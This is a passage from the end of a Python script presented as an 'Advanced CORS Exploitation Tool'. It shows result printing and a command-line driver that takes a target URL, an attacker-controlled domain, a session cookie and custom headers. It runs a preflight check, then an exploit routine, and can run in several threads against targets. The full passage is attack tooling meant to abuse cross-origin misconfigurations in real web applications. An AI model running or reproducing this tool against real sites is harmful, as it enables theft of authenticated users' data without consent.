            print(f"[X] Exploit Failed! Response Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[X] Error: {e}")

def run_exploit(target, attacker_domain, cookie, custom_headers):
    print(f"[+] Checking preflight request on {target}...")
    if exploit_preflight(target, attacker_domain, custom_headers):
        print("\n[+] Attempting exploitation...")
        exploit_cors(target, attacker_domain, cookie, custom_headers)
    else:
        print("[X] Exploitation aborted. Target did not pass preflight check.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced CORS Exploitation Tool")
    parser.add_argument("-t", "--target", required=True, help="Target URL to exploit")
    parser.add_argument("-a", "--attacker-domain", required=True, help="Attacker-controlled subdomain")
    parser.add_argument("-c", "--cookie", required=False, help="Session cookie (optional)")
    parser.add_argument("-H", "--headers", nargs="*", help="Custom headers (format: key:value)")
    parser.add_argument("-T", "--threads", type=int, default=1, help="Number of threads for multi-target exploitation")

    args = parser.parse_args()

    custom_headers = {}
    if args.headers:
        for header in args.headers:
            key, value = header.split(":", 1)
            custom_headers[key.strip()] = value.strip()

    if args.threads > 1:
        print(f"[+] Running with {args.threads} threads...")
        threads = []
        for _ in range(args.threads):
            thread = threading.Thread(target=run_exploit, args=(args.target, args.attacker_domain, args.cookie, custom_headers))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()
    else:
        run_exploit(args.target, args.attacker_domain, args.cookie, custom_headers)
